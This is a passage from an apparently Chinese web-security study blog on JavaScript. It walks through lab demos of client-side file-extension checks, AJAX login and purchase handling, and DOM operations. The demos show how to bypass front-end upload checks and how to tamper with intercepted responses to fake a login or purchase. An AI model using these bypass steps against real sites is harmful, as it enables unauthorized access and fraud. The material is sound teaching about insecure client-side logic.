class="comment">//flag为一个标志</span></span><br><span class="line">        <span class="comment">// 允许的文件后缀名数组</span></span><br><span class="line">        <span class="keyword">var</span> exts = [<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line">        <span class="comment">// 获取文件名中最后一个点后面的部分，即文件的后缀名</span></span><br><span class="line">        <span class="keyword">var</span> index = filename.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> ext = filename.<span class="title function_ invoke__">substr</span>(index + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历允许的文件后缀名数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; exts.length; i++) &#123;</span><br><span class="line">            <span class="comment">// 检查是否匹配允许的后缀名</span></span><br><span class="line">            <span class="keyword">if</span> (ext === exts[i]) &#123;</span><br><span class="line">                <span class="comment">// 文件后缀名正确，设置 flag 为 true，显示提示信息，并跳出循环</span></span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">                <span class="title function_ invoke__">alert</span>(<span class="string">&#x27;文件后缀名正确&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 flag 为 false，表示文件后缀名错误，显示错误提示，并强制刷新页面</span></span><br><span class="line">        <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">            <span class="title function_ invoke__">alert</span>(<span class="string">&#x27;文件后缀错误！&#x27;</span>)</span><br><span class="line">            location.<span class="title function_ invoke__">reload</span>(<span class="literal">true</span>);<span class="comment">//重载页面，错误的话重新刷新页面</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>直接写在html代码中，前端JS验证</p><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><p>禁用JS或删除过滤代码绕过</p><p>删除过滤代码：</p><p>将页面源代码复制下来，在本地创建，并删除检验代码的函数调用onchange&#x3D;”CheckFileExt(this.value)”</p><p>将调用的文件上传地址，切换为使用网址路由的样式<a href="http://192.168.137.1:84/js/upload.php">http://192.168.137.1:84/js/upload.php</a></p><p>成功绕过文件检验，上传成功1.exe</p><blockquote><p>在本地源代码文件中实现远程文件上传，使用调用的文件上传地址</p></blockquote><h1 id="JS导入库开发"><a href="#JS导入库开发" class="headerlink" title="JS导入库开发"></a>JS导入库开发</h1><p>后端php实现账户判断，前端JS实现登录处理</p><p>val() 是 jQuery 的一个方法，用来获取或设置表单元素的值</p><h2 id="JS实现登录验证"><a href="#JS实现登录验证" class="headerlink" title="JS实现登录验证"></a>JS实现登录验证</h2><p>$.ajax()是一个用于执行异步HTTP请求的jQuery函数。它允许您通过JavaScript代码向服务器发送请求，并在不刷新整个页面的情况下接收和处理响应。</p><p>下面是一个基本的$.ajax()用法示例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_ invoke__">ajax</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&quot;example.com/data&quot;</span>,  // 请求的URL</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span>,            // HTTP请求方法（GET、POST等）</span><br><span class="line">  <span class="attr">data</span>: &#123;                   // 发送到服务器的数据（可选）</span><br><span class="line">    <span class="attr">param1</span>: <span class="string">&quot;value1&quot;</span>,</span><br><span class="line">    <span class="attr">param2</span>: <span class="string">&quot;value2&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">success</span>: function(response) &#123;  <span class="comment">// 请求成功时的回调函数</span></span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;请求成功！&quot;</span>);</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(response);       <span class="comment">// 服务器响应的数据</span></span><br><span class="line">  &#125;,</span><br><span class="line">  error: <span class="function"><span class="keyword">function</span>(<span class="params">xhr, status, error</span>) </span>&#123;  <span class="comment">// 请求失败时的回调函数</span></span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;请求失败！&quot;</span>);</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(error);                    <span class="comment">// 错误信息</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 登录标题 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>后台登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 用户名标签和输入框 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 密码标签和输入框 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pass&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 登录按钮 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">**<span class="comment">&lt;!-- 引入 jQuery 库 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/jquery-1.12.4.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>**</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- JavaScript 代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 当按钮被点击时执行以下函数</span></span></span><br><span class="line"><span class="language-javascript">  $(<span class="string">&quot;button&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 使用 AJAX 发送 POST 请求到 &#x27;logincheck.php&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">url</span>: <span class="string">&#x27;logincheck.php&#x27;</span>,<span class="comment">//数据提交地址</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 发送的数据包括用户名和密码</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">myuser</span>: $(<span class="string">&#x27;.user&#x27;</span>).<span class="title function_">val</span>(),</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">mypass</span>: $(<span class="string">&#x27;.pass&#x27;</span>).<span class="title function_">val</span>()</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 请求成功时执行的函数</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">res</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 如果返回的信息代码为1，表示登录成功，弹出提示并执行相应的处理</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(res[<span class="string">&#x27;infoCode&#x27;</span>] == <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">alert</span>(<span class="string">&#x27;登录成功&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// 登录成功处理事件（注释部分为示例，可根据需要进行处理）</span></span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// location.href=&#x27;index.php&#x27;;</span></span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// 如果信息代码不为1，表示登录失败，弹出失败提示</span></span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">alert</span>(<span class="string">&#x27;登录失败&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 指定返回的数据类型为 JSON</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// 从 POST 请求中获取用户提交的用户名和密码</span></span><br><span class="line">  <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;myuser&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mypass&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 真实情况下，应该在数据库中进行验证获取用户信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设用户名是 &#x27;xiaodi&#x27;，密码是 &#x27;123456&#x27;</span></span><br><span class="line">**<span class="comment">//$success 是一个关联数组变量，通过使用 &#x27;msg&#x27; 作为键，将 &#x27;ok&#x27; 作为值存储在其中。</span></span><br><span class="line"><span class="variable">$success</span> = <span class="keyword">array</span>(<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>);**</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户名和密码是否匹配</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span> == <span class="string">&#x27;xiaodi&#x27;</span> &amp;&amp; <span class="variable">$pass</span> == <span class="string">&#x27;123456&#x27;</span>) &#123;</span><br><span class="line">  <span class="comment">// 如果匹配，设置信息代码为1表示登录成功，并进行相应的处理</span></span><br><span class="line">  <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 如果不匹配，设置信息代码为0表示登录失败</span></span><br><span class="line">  <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">**<span class="comment">// 将结果以 JSON 格式输出</span></span><br><span class="line"><span class="comment">//必须要回调输出，不然前端无法获取infocode的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$success</span>);**</span><br></pre></td></tr></table></figure><h2 id="安全问题-1"><a href="#安全问题-1" class="headerlink" title="安全问题"></a>安全问题</h2><p>登陆成功后的处理操作写在JS里</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(res[<span class="string">&#x27;infoCode&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">          <span class="title function_ invoke__">alert</span>(<span class="string">&#x27;登录成功&#x27;</span>);</span><br><span class="line">          <span class="comment">// 登录成功处理事件（注释部分为示例，可根据需要进行处理）</span></span><br><span class="line">          <span class="comment">// location.href=&#x27;index.php&#x27;;</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>我们直接抓包修改infoCode的值为1，可以绕过登录</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731738666242-fc07c526-71b5-4b5f-9801-7c68c2c815b7.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731738672328-1fd2dc74-c8d5-4059-b558-38225c32b4fd.png"></p><p>前提是仅仅通过infoCode这一参数来校验是否登录成功</p><p>当成功后的操作如跳转到其他页面写在PHP中，相对安全</p><p>前端js只起到判断作用，无法执行跳转等逻辑</p><h2 id="逻辑购买"><a href="#逻辑购买" class="headerlink" title="逻辑购买"></a>逻辑购买</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置文档的字符集为UTF-8 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置页面标题 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>商品购买<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 商品图片 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;iphone.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 当前拥有的金钱 --&gt;</span></span><br><span class="line">    金钱：10000<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 商品价格 --&gt;</span></span><br><span class="line">    商品价格：8888<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 输入购买数量的文本框 --&gt;</span></span><br><span class="line">    数量：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;number&quot;</span> <span class="attr">class</span>=<span class="string">&quot;number&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 购买按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>购买<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入 jQuery 库 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/jquery-1.12.4.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- JavaScript 代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 当购买按钮被点击时执行以下函数</span></span></span><br><span class="line"><span class="language-javascript">  $(<span class="string">&quot;button&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 使用 AJAX 发送 POST 请求到 &#x27;shop.php&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    **$.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">url</span>: <span class="string">&#x27;shop.php&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 发送的数据，包括购买数量</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">num</span>: $(<span class="string">&#x27;.number&#x27;</span>).<span class="title function_">val</span>(),</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 请求成功时执行的函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">res</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 在控制台输出返回的数据</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 如果返回的信息代码为1，表示购买成功</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span>(res[<span class="string">&#x27;infoCode&#x27;</span>] == <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 弹出成功提示</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;购买成功&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 购买成功的流程（你可以在这里添加额外的处理）</span></span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 如果信息代码不为1，表示购买失败</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 弹出失败提示</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;购买失败&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 指定返回的数据类型为 JSON</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  &#125;);**</span></span><br><span class="line"><span class="language-javascript">                    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// 从 POST 请求中获取购买数量</span></span><br><span class="line">  <span class="variable">$num</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设购物车中已有的金钱数为10000，商品价格为8888</span></span><br><span class="line"><span class="comment">// 真实情况下，应该在数据库中获取用户的金钱数等信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化一个关联数组变量，通过使用 &#x27;msg&#x27; 作为键，将 &#x27;ok&#x27; 作为值存储在其中。</span></span><br><span class="line"><span class="variable">$success</span> = <span class="keyword">array</span>(<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line"></span><br><span class="line">**<span class="comment">// 检查购买是否合法（金钱是否足够支付）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">10000</span> &gt;= (<span class="variable">$num</span> * <span class="number">8888</span>)) &#123;</span><br><span class="line">  <span class="comment">// 如果购买合法，设置信息代码为1表示购买成功</span></span><br><span class="line">  <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 如果购买不合法，设置信息代码为0表示购买失败</span></span><br><span class="line">  <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果以 JSON 格式输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$success</span>);**</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将抓到的包，设置其返回包也抓取，并将访问失败返回包的改为1发送，后购买成功。</p><p>当成功后的操作如购买成功后的逻辑到其他页面写在js中，不安全</p><h1 id="DOM树"><a href="#DOM树" class="headerlink" title="DOM树"></a>DOM树</h1><p>DOM：文档操作对象</p><p>浏览器提供的一套专门用来操作网页代码内容的功能，实现自主或用户交互动作反馈</p><blockquote><p>演示操作：</p><p>当点击按钮的时候会进行图片替换，要获取该图片的对象，获取对象的src属性，替换src属性</p></blockquote><h2 id="获取对象"><a href="#获取对象" class="headerlink" title="获取对象"></a>获取对象</h2><p>获取对象三种方法</p><p>1.标签：直接写</p><p>2.Class：加上符号.</p><p>i3.id：加上符号#</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- 这是标题 --&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;myHeader&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">  &lt;!-- 选择第一个 h1 元素 --&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;h1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  &lt;!-- 选择所有具有 <span class="string">&#x27;id&#x27;</span> 类的元素 --&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.id&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  &lt;!-- 选择具有 <span class="string">&#x27;myHeader&#x27;</span> id 的元素 --&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#myHeader&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>console.log(): 是一个用于在控制台输出信息的方法。它是由浏览器或其他 JavaScript 运行环境提供的调试工具。通过调用 console.log()，您可以在控制台中输出消息、变量的值、调试信息等，以便在开发过程中进行调试和测试。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">这行代码将在控制台输出字符串 <span class="string">&quot;Hello, world!&quot;</span>。</span><br></pre></td></tr></table></figure><h2 id="获取对象属性"><a href="#获取对象属性" class="headerlink" title="获取对象属性"></a>获取对象属性</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;update()&quot;</span>&gt;</span>刷新<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--当点击按钮，执行update函数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">update</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> s=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>)<span class="comment">//获取img标签的内容,并赋值给s（这里也可以使用var声明变量s）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(s)<span class="comment">//控制台打印s变量的内容</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>每次点击刷新按钮，控制台都会输入img标签的内容</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731754590813-ac8f7f47-2e18-4dbd-b759-97670295af52.png"></p><h2 id="操作元素数据"><a href="#操作元素数据" class="headerlink" title="操作元素数据"></a>操作元素数据</h2><h3 id="innerText-不解析后续代码"><a href="#innerText-不解析后续代码" class="headerlink" title="innerText 不解析后续代码"></a>innerText 不解析后续代码</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;update1()&quot;</span>&gt;</span>这是标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;update()&quot;</span>&gt;</span>刷新<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--当点击按钮，执行update函数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">update</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> s=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>)<span class="comment">//获取img标签的内容,并赋值给s（这里也可以使用var声明变量s）</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(s)<span class="comment">//控制台打印s变量的内容</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">update1</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> s=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;h1&#x27;</span>)<span class="comment">//获取h1标签的内容,并赋值给s</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="property">innerText</span>)<span class="comment">//控制台打印h1标签的数据</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>每次点击“这是标题”，控制台都会打印一遍</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731754985519-dc50adf3-eebe-434a-a02a-6ddb714e324f.png"></p><p>当吧update1中获得的h1标签的数据先赋值给一个变量，在更改这个变量的内容，最后打印数据，h1标签的数据就会被改变</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">function update1()&#123;</span><br><span class="line">        const s=document.querySelector(&#x27;h1&#x27;)</span><br><span class="line">        const str=s.innerText=&quot;这是hx&quot;</span><br><span class="line">        console.log(str)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731755462077-4b1fef0f-5066-4df2-ab25-a6b2d38fbe10.png"></p><h3 id="innerHTML-解析后续代码"><a href="#innerHTML-解析后续代码" class="headerlink" title="innerHTML 解析后续代码"></a>innerHTML 解析后续代码</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;update1()&quot;</span>&gt;</span>这是标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;update()&quot;</span>&gt;</span>刷新<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--当点击按钮，执行update函数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 